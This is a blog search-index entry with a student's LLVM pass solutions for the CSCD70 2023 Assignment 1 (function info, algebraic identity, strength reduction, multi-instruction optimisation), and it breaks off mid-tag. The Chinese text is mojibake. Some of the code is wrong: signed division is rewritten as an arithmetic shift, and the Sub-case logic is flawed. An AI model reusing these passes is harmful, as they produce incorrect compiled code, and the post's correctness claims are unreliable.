<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CSCD70 2023s Assignment1-Introduction_to_LLVM è®°å½•</title>
      <link href="/2025/07/01/CSCD70%202023s%20Assignment1-Introduction_to_LLVM%20%E8%AE%B0%E5%BD%95/"/>
      <url>/2025/07/01/CSCD70%202023s%20Assignment1-Introduction_to_LLVM%20%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="CSCD70-2023s-Assignment1-Introduction-to-LLVM-è®°å½•"><a href="#CSCD70-2023s-Assignment1-Introduction-to-LLVM-è®°å½•" class="headerlink" title="CSCD70 2023s Assignment1-Introduction_to_LLVM è®°å½•"></a>CSCD70 2023s Assignment1-Introduction_to_LLVM è®°å½•</h1><p>è¿™é‡Œæˆ‘åªé™„ä¸Šä»£ç å’Œæ•ˆæœå“ˆï¼Œå…·ä½“çš„å®éªŒè¦æ±‚å’Œè¿‡ç¨‹çœ‹è¿™ä¸ª<a href="https://www.overleaf.com/read/nvmnmbntgwqn">é“¾æ¥</a></p><h2 id="FunctionInfo"><a href="#FunctionInfo" class="headerlink" title="FunctionInfo"></a>FunctionInfo</h2><p>è¿™ä¸ªå‡½æ•°ä¸»è¦æ˜¯æ”¶é›†ä¿¡æ¯ï¼Œä¸»è¦æ˜¯æ‰“å°å¯¹é½éœ€è¦æ³¨æ„ä¸€ä¸‹</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;llvm/Passes/PassBuilder.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;llvm/Passes/PassPlugin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;llvm/Support/raw_ostream.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FunctionInfoPass</span> <span class="keyword">final</span> :</span> <span class="keyword">public</span> PassInfoMixin&lt;FunctionInfoPass&gt; &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">PreservedAnalyses <span class="title">run</span><span class="params">([[maybe_unused]] Module &amp;M, ModuleAnalysisManager &amp;)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">outs</span>() &lt;&lt; <span class="string">&quot;CSCD70 Function Information Pass&quot;</span></span><br><span class="line">           &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="built_in">outs</span>() &lt;&lt; <span class="string">&quot;-----------------------------------------------------------------\n&quot;</span>;</span><br><span class="line">    <span class="built_in">outs</span>()&lt;&lt;formatv(<span class="string">&quot;&#123;0,=20&#125;&#123;1,=10&#125;&#123;2,=10&#125;&#123;3,=10&#125;&#123;4,=10&#125;\n&quot;</span>,<span class="string">&quot;Name&quot;</span>,<span class="string">&quot;#Args&quot;</span>,<span class="string">&quot;#Calls&quot;</span>,<span class="string">&quot;#Blocks&quot;</span>,<span class="string">&quot;#Insts&quot;</span>);</span><br><span class="line">    <span class="built_in">outs</span>() &lt;&lt; <span class="string">&quot;-----------------------------------------------------------------\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(Function &amp;F : M)&#123;</span><br><span class="line">      <span class="keyword">if</span>(F.<span class="built_in">isDeclaration</span>()) <span class="keyword">continue</span>;<span class="comment">//è·³è¿‡å‡½æ•°å£°æ˜</span></span><br><span class="line">            <span class="built_in">analyzeFunction</span>(F);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">outs</span>() &lt;&lt; <span class="string">&quot;-----------------------------------------------------------------\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> PreservedAnalyses::<span class="built_in">all</span>();</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">analyzeFunction</span><span class="params">(Function &amp;F)</span></span>&#123;</span><br><span class="line">    StringRef funcName = F.<span class="built_in">getName</span>();<span class="comment">//è·å–å‡½æ•°å</span></span><br><span class="line">    <span class="keyword">unsigned</span> argNum = F.<span class="built_in">arg_size</span>();<span class="comment">//è·å–å‚æ•°ä¸ªæ•°</span></span><br><span class="line">    <span class="keyword">unsigned</span> callNum = F.<span class="built_in">getNumUses</span>();<span class="comment">//è·å–è¢«è°ƒç”¨æ¬¡æ•°</span></span><br><span class="line">    <span class="keyword">unsigned</span> bbNum = F.<span class="built_in">size</span>();<span class="comment">//åŸºæœ¬å—ä¸ªæ•°</span></span><br><span class="line">    <span class="keyword">unsigned</span> instrNum = F.<span class="built_in">getInstructionCount</span>();<span class="comment">//æŒ‡ä»¤æ€»æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">outs</span>() &lt;&lt; formatv(<span class="string">&quot;&#123;0,=20&#125;&#123;1,=10&#125;&#123;2,=10&#125;&#123;3,=10&#125;&#123;4,=10&#125;\n&quot;</span>,</span><br><span class="line">                 funcName, </span><br><span class="line">                 argNum, </span><br><span class="line">                 callNum, </span><br><span class="line">                 bbNum, </span><br><span class="line">                 instrNum);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;; <span class="comment">// class FunctionInfoPass</span></span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">// anonymous namespace</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">PassPluginLibraryInfo <span class="title">llvmGetPassPluginInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">      .APIVersion = LLVM_PLUGIN_API_VERSION,</span><br><span class="line">      .PluginName = <span class="string">&quot;FunctionInfo&quot;</span>,</span><br><span class="line">      .PluginVersion = LLVM_VERSION_STRING,</span><br><span class="line">      .RegisterPassBuilderCallbacks =</span><br><span class="line">          [](PassBuilder &amp;PB) &#123;</span><br><span class="line">            PB.<span class="built_in">registerPipelineParsingCallback</span>(</span><br><span class="line">                [](StringRef Name, ModulePassManager &amp;MPM,</span><br><span class="line">                   ArrayRef&lt;PassBuilder::PipelineElement&gt;) -&gt; <span class="keyword">bool</span> &#123;</span><br><span class="line">                  <span class="keyword">if</span> (Name == <span class="string">&quot;function-info&quot;</span>) &#123;</span><br><span class="line">                    MPM.<span class="built_in">addPass</span>(<span class="built_in">FunctionInfoPass</span>());</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;);</span><br><span class="line">          &#125; <span class="comment">// RegisterPassBuilderCallbacks</span></span><br><span class="line">  &#125;;        <span class="comment">// struct PassPluginLibraryInfo</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹</p><p><img src="https://kr0emer-blog-1306550410.cos.ap-nanjing.myqcloud.com/img/image-20250701115438028.png" alt="image-20250701115438028"></p><h2 id="LocalOpts"><a href="#LocalOpts" class="headerlink" title="LocalOpts"></a>LocalOpts</h2><h3 id="1-AlgebraicIdentity"><a href="#1-AlgebraicIdentity" class="headerlink" title="1-AlgebraicIdentity"></a>1-AlgebraicIdentity</h3><p>è¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥å¤„ç†ä¸€äº›è¯¸å¦‚<strong>ğ‘¥ + 0 = 0 + ğ‘¥, ğ‘¥ Ã— 1 = 1 Ã— ğ‘¥ â‡’ ğ‘¥</strong>çš„æƒ…å†µ,å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œé™¤æ³•å’Œå‡æ³•æ³¨æ„å¤„ç†ä¸¤ä¸ªæ“ä½œæ•°ä¸€è‡´çš„æƒ…å†µ</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;LocalOpts.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="function">PreservedAnalyses <span class="title">AlgebraicIdentityPass::run</span><span class="params">([[maybe_unused]] Function &amp;F,</span></span></span><br><span class="line"><span class="params"><span class="function">                                             FunctionAnalysisManager &amp;)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">//è¿™é‡Œä½œä¸ºç»ƒä¹ åªè€ƒè™‘Addï¼ŒSubï¼ŒMulï¼ŒSDivï¼Œä¸è€ƒè™‘æ— ç¬¦å·æ•°</span></span><br><span class="line">  <span class="keyword">bool</span> Changed = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;BB : F)</span><br><span class="line">  &#123;</span><br><span class="line">    SmallVector&lt;Instruction *, <span class="number">16</span>&gt; DeadInsts; <span class="comment">// æ”¶é›†å¾…åˆ é™¤æŒ‡ä»¤,å¦‚æœå°äº16ä¸ªå°±ä¿å­˜åœ¨æ ˆï¼Œå¦‚æœå¤§äºå°±å­˜åœ¨å †é‡Œ</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;I : <span class="built_in">make_early_inc_range</span>(BB))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(isa&lt;BinaryOperator&gt;(I))</span><br><span class="line">      &#123;</span><br><span class="line">        Value *Op1 = I.<span class="built_in">getOperand</span>(<span class="number">0</span>);<span class="comment">//è·å–æ“ä½œæ•°</span></span><br><span class="line">        Value *Op2 = I.<span class="built_in">getOperand</span>(<span class="number">1</span>);</span><br><span class="line">        ConstantInt *CI1 = dyn_cast&lt;ConstantInt&gt;(Op1);<span class="comment">//å°è¯•è½¬åŒ–ä¸ºå¸¸é‡</span></span><br><span class="line">        ConstantInt *CI2 = dyn_cast&lt;ConstantInt&gt;(Op2);</span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span> (I.<span class="built_in">getOpcode</span>()) </span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> Instruction::Add:<span class="comment">//åŠ æ³•</span></span><br><span class="line">            <span class="keyword">if</span>(CI1 &amp;&amp; CI1-&gt;<span class="built_in">isZero</span>())</span><br><span class="line">            &#123;</span><br><span class="line">              I.<span class="built_in">replaceAllUsesWith</span>(Op2);</span><br><span class="line">              DeadInsts.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(CI2 &amp;&amp; CI2-&gt;<span class="built_in">isZero</span>())</span><br><span class="line">            &#123;</span><br><span class="line">              I.<span class="built_in">replaceAllUsesWith</span>(Op1);</span><br><span class="line">              DeadInsts.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> Instruction::Sub:<span class="comment">//å‡æ³•</span></span><br><span class="line">            <span class="keyword">if</span>(CI2 &amp;&amp; CI2-&gt;<span class="built_in">isZero</span>())</span><br><span class="line">            &#123;</span><br><span class="line">              I.<span class="built_in">replaceAllUsesWith</span>(Op1);</span><br><span class="line">              DeadInsts.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(Op1 == Op2)</span><br><span class="line">            &#123;</span><br><span class="line">              I.<span class="built_in">replaceAllUsesWith</span>(ConstantInt::<span class="built_in">getSigned</span>(I.<span class="built_in">getType</span>(), <span class="number">0</span>));</span><br><span class="line">              DeadInsts.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> Instruction::Mul:<span class="comment">//ä¹˜æ³•</span></span><br><span class="line">            <span class="keyword">if</span>(CI1 &amp;&amp; CI1-&gt;<span class="built_in">isOne</span>())</span><br><span class="line">            &#123;</span><br><span class="line">              I.<span class="built_in">replaceAllUsesWith</span>(Op2);</span><br><span class="line">              DeadInsts.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(CI2 &amp;&amp; CI2-&gt;<span class="built_in">isOne</span>())</span><br><span class="line">            &#123;</span><br><span class="line">              I.<span class="built_in">replaceAllUsesWith</span>(Op1);</span><br><span class="line">              DeadInsts.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> Instruction::SDiv:<span class="comment">//é™¤æ³•</span></span><br><span class="line">            <span class="keyword">if</span>(CI2 &amp;&amp; CI2-&gt;<span class="built_in">isOne</span>())</span><br><span class="line">            &#123;</span><br><span class="line">              I.<span class="built_in">replaceAllUsesWith</span>(Op1);</span><br><span class="line">              DeadInsts.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (Op1 == Op2)</span><br><span class="line">            &#123;</span><br><span class="line">              I.<span class="built_in">replaceAllUsesWith</span>(ConstantInt::<span class="built_in">getSigned</span>(I.<span class="built_in">getType</span>(), <span class="number">1</span>));</span><br><span class="line">              DeadInsts.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!DeadInsts.<span class="built_in">empty</span>()) </span><br><span class="line">    &#123;</span><br><span class="line">      Changed = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">for</span> (Instruction *DeadI : DeadInsts) </span><br><span class="line">      &#123;</span><br><span class="line">        DeadI-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Changed ? PreservedAnalyses::<span class="built_in">none</span>() : PreservedAnalyses::<span class="built_in">all</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-StrengthReduction"><a href="#2-StrengthReduction" class="headerlink" title="2-StrengthReduction"></a>2-StrengthReduction</h3><p>è¿™ä¸ªå‡½æ•°æ˜¯å¤„ç†<strong>4 Ã— ğ‘¥ = ğ‘¥ Ã— 4 â‡’ or ğ‘¥ â‰ª 2</strong>è¿™ç§æƒ…å†µçš„ï¼ŒåŒ…æ‹¬é™¤æ³•å’Œä¹˜æ³•ï¼Œæ³¨æ„é™¤æ³•è¦ä½¿ç”¨Ashé˜²æ­¢è¢«é™¤æ•°ä¸ºè´Ÿæ•°</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;LocalOpts.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">PreservedAnalyses <span class="title">StrengthReductionPass::run</span><span class="params">([[maybe_unused]] Function &amp;F,</span></span></span><br><span class="line"><span class="params"><span class="function">                                             FunctionAnalysisManager &amp;)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">bool</span> Changed = <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;BB:F)</span><br><span class="line">  &#123;</span><br><span class="line">    SmallVector&lt;Instruction *, <span class="number">16</span>&gt; DeadInsts; <span class="comment">// æ”¶é›†å¾…åˆ é™¤æŒ‡ä»¤,å¦‚æœå°äº16ä¸ªå°±ä¿å­˜åœ¨æ ˆï¼Œå¦‚æœå¤§äºå°±å­˜åœ¨å †é‡Œ</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;I:<span class="built_in">make_early_inc_range</span>(BB))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(isa&lt;BinaryOperator&gt;(I))</span><br><span class="line">      &#123;</span><br><span class="line">        Value *Op1 = I.<span class="built_in">getOperand</span>(<span class="number">0</span>);<span class="comment">//è·å–æ“ä½œæ•°</span></span><br><span class="line">        Value *Op2 = I.<span class="built_in">getOperand</span>(<span class="number">1</span>);</span><br><span class="line">        ConstantInt *CI1 = dyn_cast&lt;ConstantInt&gt;(Op1);<span class="comment">//å°è¯•è½¬åŒ–ä¸ºå¸¸é‡</span></span><br><span class="line">        ConstantInt *CI2 = dyn_cast&lt;ConstantInt&gt;(Op2);</span><br><span class="line">        <span class="keyword">bool</span> StrengthFlag = <span class="literal">true</span>;</span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span> (I.<span class="built_in">getOpcode</span>()) </span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> Instruction::Mul:<span class="comment">//ä¹˜æ³•</span></span><br><span class="line">            <span class="keyword">if</span>( CI1 &amp;&amp; CI1-&gt;<span class="built_in">getSExtValue</span>() &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">isPowerOf2_64</span>(CI1-&gt;<span class="built_in">getZExtValue</span>()))</span><br><span class="line">            &#123;</span><br><span class="line">              Value* ShiftVal = ConstantInt::<span class="built_in">get</span>(CI1-&gt;<span class="built_in">getType</span>(),<span class="built_in">countTrailingZeros</span>(CI1-&gt;<span class="built_in">getZExtValue</span>()));</span><br><span class="line">              I.<span class="built_in">replaceAllUsesWith</span>(</span><br><span class="line">                BinaryOperator::<span class="built_in">Create</span>(Instruction::Shl, Op2, ShiftVal, <span class="string">&quot;&quot;</span>, &amp;I)</span><br><span class="line">              );</span><br><span class="line">              DeadInsts.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(CI2 &amp;&amp; CI2-&gt;<span class="built_in">getSExtValue</span>() &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">isPowerOf2_64</span>(CI2-&gt;<span class="built_in">getZExtValue</span>()))</span><br><span class="line">            &#123;</span><br><span class="line">              Value* ShiftVal = ConstantInt::<span class="built_in">get</span>(CI2-&gt;<span class="built_in">getType</span>(),<span class="built_in">countTrailingZeros</span>(CI2-&gt;<span class="built_in">getZExtValue</span>()));</span><br><span class="line">              I.<span class="built_in">replaceAllUsesWith</span>(</span><br><span class="line">                BinaryOperator::<span class="built_in">Create</span>(Instruction::Shl, Op1, ShiftVal, <span class="string">&quot;&quot;</span>, &amp;I)</span><br><span class="line">              );</span><br><span class="line">              DeadInsts.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> Instruction::SDiv:<span class="comment">//é™¤æ³•</span></span><br><span class="line">            <span class="keyword">if</span>(CI2 &amp;&amp; CI2-&gt;<span class="built_in">getSExtValue</span>() &gt; <span class="number">0</span> &amp;&amp; <span class="built_in">isPowerOf2_64</span>(CI2-&gt;<span class="built_in">getZExtValue</span>()))</span><br><span class="line">            &#123;</span><br><span class="line">              Value* ShiftVal = ConstantInt::<span class="built_in">get</span>(CI2-&gt;<span class="built_in">getType</span>(),<span class="built_in">countTrailingZeros</span>(CI2-&gt;<span class="built_in">getZExtValue</span>()));</span><br><span class="line">              I.<span class="built_in">replaceAllUsesWith</span>(</span><br><span class="line">                BinaryOperator::<span class="built_in">Create</span>(Instruction::AShr, Op1, ShiftVal, <span class="string">&quot;&quot;</span>, &amp;I)</span><br><span class="line">              );</span><br><span class="line">              DeadInsts.<span class="built_in">push_back</span>(&amp;I);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!DeadInsts.<span class="built_in">empty</span>())</span><br><span class="line">    &#123;</span><br><span class="line">      Changed = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">for</span>(Instruction *DeadI : DeadInsts)&#123;</span><br><span class="line">        DeadI-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Changed ? PreservedAnalyses::<span class="built_in">none</span>() : PreservedAnalyses::<span class="built_in">all</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-MultiInstOpt"><a href="#3-MultiInstOpt" class="headerlink" title="3-MultiInstOpt"></a>3-MultiInstOpt</h3><p>è¿™ä¸ªå‡½æ•°æ˜¯å¤šæŒ‡ä»¤ä¼˜åŒ–ï¼Œä¸»è¦æ˜¯å¤„ç†<strong>ğ‘ = ğ‘ + 1, ğ‘ = ğ‘ âˆ’ 1 â‡’ ğ‘ = ğ‘ + 1, ğ‘ = ğ‘</strong>è¿™ç§æƒ…å†µçš„,è¿™é‡Œæˆ‘ä¸€å¼€å§‹è¿˜å‡†å¤‡ä¼˜åŒ–é™¤æ³•å’Œä¹˜æ³•ï¼Œä½†æ˜¯æœ€åå†™å®Œäº†æ‰å‘ç°æœ‰å¯èƒ½å‡ºç°æº¢å‡ºçš„æƒ…å†µï¼Œæ‰€ä»¥ä¸é€‚ç”¨ï¼Œå°±åªåšäº†åŠ æ³•å’Œå‡æ³•çš„</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;LocalOpts.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> llvm;</span><br><span class="line"></span><br><span class="line"><span class="function">PreservedAnalyses <span class="title">MultiInstOptPass::run</span><span class="params">([[maybe_unused]] Function &amp;F,</span></span></span><br><span class="line"><span class="params"><span class="function">                                        FunctionAnalysisManager &amp;)</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">bool</span> Changed = <span class="literal">false</span>;</span><br><span class="line">  SmallVector&lt;Instruction *, <span class="number">32</span>&gt; DeadInsts;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;BB : <span class="built_in">make_early_inc_range</span>(F))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;I:<span class="built_in">make_early_inc_range</span>(BB))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(isa&lt;BinaryOperator&gt;(I))</span><br><span class="line">      &#123;</span><br><span class="line">        Value *Op1 = I.<span class="built_in">getOperand</span>(<span class="number">0</span>);<span class="comment">//è·å–æ“ä½œæ•°</span></span><br><span class="line">        Value *Op2 = I.<span class="built_in">getOperand</span>(<span class="number">1</span>);</span><br><span class="line">        ConstantInt *CI1 = dyn_cast&lt;ConstantInt&gt;(Op1);<span class="comment">//å°è¯•è½¬åŒ–ä¸ºå¸¸é‡</span></span><br><span class="line">        ConstantInt *CI2 = dyn_cast&lt;ConstantInt&gt;(Op2);</span><br><span class="line">        Value *Var = <span class="literal">nullptr</span>;</span><br><span class="line">        ConstantInt *Con = <span class="literal">nullptr</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(CI1 &amp;&amp; !CI2)</span><br><span class="line">        &#123;</span><br><span class="line">          Con = CI1;</span><br><span class="line">          Var = Op2;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!CI1 &amp;&amp; CI2)</span><br><span class="line">        &#123;</span><br><span class="line">          Con = CI2;</span><br><span class="line">          Var = Op1;</span><br><span class="line">        &#125;<span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span> (I.<span class="built_in">getOpcode</span>()) </span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> Instruction::Add:</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> *U : I.<span class="built_in">users</span>())</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span>(<span class="keyword">auto</span> *II = dyn_cast&lt;BinaryOperator&gt;(U))</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span>(II-&gt;<span class="built_in">getOpcode</span>()==Instruction::Sub &amp;&amp; II-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>) == &amp;I)</span><br><span class="line">                &#123;</span><br><span class="line">                  ConstantInt *CCI2 = dyn_cast&lt;ConstantInt&gt;(II-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>));</span><br><span class="line">                  <span class="keyword">if</span>(CCI2 &amp;&amp; (CCI2-&gt;<span class="built_in">getValue</span>() == Con-&gt;<span class="built_in">getValue</span>()))</span><br><span class="line">                  &#123;</span><br><span class="line">                    II-&gt;<span class="built_in">replaceAllUsesWith</span>(Var);</span><br><span class="line">                    DeadInsts.<span class="built_in">push_back</span>(II);</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;       </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          </span><br><span class="line">          <span class="keyword">case</span> Instruction :: Sub:</span><br><span class="line">          &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(!CI1 &amp;&amp; CI2)</span><br><span class="line">            &#123;</span><br><span class="line">              </span><br><span class="line">              SmallVector&lt;Instruction *, <span class="number">16</span>&gt; DeadInsts;</span><br><span class="line">              <span class="keyword">for</span>(<span class="keyword">auto</span> *U : I.<span class="built_in">users</span>())</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">auto</span> *II = dyn_cast&lt;BinaryOperator&gt;(U))</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span>(II-&gt;<span class="built_in">getOpcode</span>()==Instruction::Add)</span><br><span class="line">                  &#123;</span><br><span class="line">                    ConstantInt *CCI1 = dyn_cast&lt;ConstantInt&gt;(II-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>));</span><br><span class="line">                    ConstantInt *CCI2 = dyn_cast&lt;ConstantInt&gt;(II-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>));</span><br><span class="line">                    <span class="keyword">if</span>(II-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>) == &amp;I)</span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="keyword">if</span>(CCI1 &amp;&amp; CCI1-&gt;<span class="built_in">getValue</span>() == Con-&gt;<span class="built_in">getValue</span>())</span><br><span class="line">                      &#123;</span><br><span class="line">                        II-&gt;<span class="built_in">replaceAllUsesWith</span>(Var);</span><br><span class="line">                        DeadInsts.<span class="built_in">push_back</span>(II);</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (II-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>) == &amp;I) </span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="keyword">if</span>(CCI2 &amp;&amp; CCI2-&gt;<span class="built_in">getValue</span>() == Con-&gt;<span class="built_in">getValue</span>())</span><br><span class="line">                      &#123;</span><br><span class="line">                        II-&gt;<span class="built_in">replaceAllUsesWith</span>(Var);</span><br><span class="line">                        DeadInsts.<span class="built_in">push_back</span>(II);</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">//ä¹˜æ³•é™¤æ³•å­˜åœ¨æº¢å‡ºé—®é¢˜ï¼Œä¸èƒ½ä¼˜åŒ–</span></span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (!DeadInsts.<span class="built_in">empty</span>()) </span><br><span class="line">  &#123;</span><br><span class="line">    Changed = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (Instruction *DeadI : DeadInsts) </span><br><span class="line">    &#123;</span><br><span class="line">      DeadI-&gt;<span class="built_in">eraseFromParent</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> Changed ? PreservedAnalyses::<span class="built_in">none</span>() : PreservedAnalyses::<span class="built_in">all</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="FileCheck"><a href="#FileCheck" class="headerlink" title="FileCheck"></a>FileCheck</h3><p>æˆ‘å·æ‡’åªåšäº†TastCase1.llçš„filecheckï¼Œæ— æ³•æ£€æŸ¥ç¬¬ä¸‰ä¸ªpassï¼Œæˆ‘é™„ä¸ŠTastCaseBasicçš„æ•ˆæœå›¾</p><figure 